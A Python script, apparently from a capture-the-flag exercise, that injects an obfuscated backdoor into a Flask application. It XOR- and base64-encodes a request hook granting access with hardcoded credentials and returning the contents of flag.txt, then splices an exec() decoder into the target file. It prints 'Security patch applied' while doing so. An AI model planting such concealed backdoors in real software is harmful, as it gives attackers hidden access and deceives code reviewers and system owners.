import sys
import base64

# XOR key for encoding/decoding
XOR_KEY = 42  # Simple XOR key

# XOR function to encrypt/decrypt data
def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

# Raw backdoor payload
RAW_BACKDOOR = """
@app.before_request
def check_backdoor():
    if request.path == "/":
        username = request.form.get("username")
        password = request.form.get("password")

        # Secret Backdoor Credentials
        if username == "sys_admin" and password == "patch_42":
            with open("flag.txt", "r") as f:
                secret_data = f.read().strip()
            print("[DEBUG] Backdoor accessed. Sending flag!")  # Debugging log
            response = f"<h1>Access Granted: {secret_data}</h1>"

            # Self-delete backdoor after execution
            with open(__file__, "r") as f:
                lines = f.readlines()
            with open(__file__, "w") as f:
                f.writelines(line for line in lines if "Secret Backdoor Credentials" not in line)

            return response
"""

# XOR encode the payload
xor_encoded = xor_encrypt_decrypt(RAW_BACKDOOR, XOR_KEY)

# Base64 encode the XOR-encrypted payload
encoded_backdoor = base64.b64encode(xor_encoded.encode()).decode()

# Decoding and execution snippet
DECODE_SNIPPET = f"""
import base64

def xor_decrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

ENCODED_PAYLOAD = "{encoded_backdoor}"
decoded = base64.b64decode(ENCODED_PAYLOAD).decode()
EXEC_CODE = xor_decrypt(decoded, {XOR_KEY})

exec(EXEC_CODE)
"""

def inject_backdoor(target_file):
    # Read the original Flask app
    with open(target_file, "r") as f:
        original_code = f.read()

    # Inject the backdoor just before running the Flask app
    patched_code = original_code.replace("if __name__ == \"__main__\":", DECODE_SNIPPET + "\n\nif __name__ == \"__main__\":")

    # Save the modified version
    with open(target_file, "w") as f:
        f.write(patched_code)

    print(f"[✔] Security patch applied. Backdoor injected into {target_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python security_patch.py <target.py>")
        sys.exit(1)

    target_file = sys.argv[1]
    inject_backdoor(target_file)
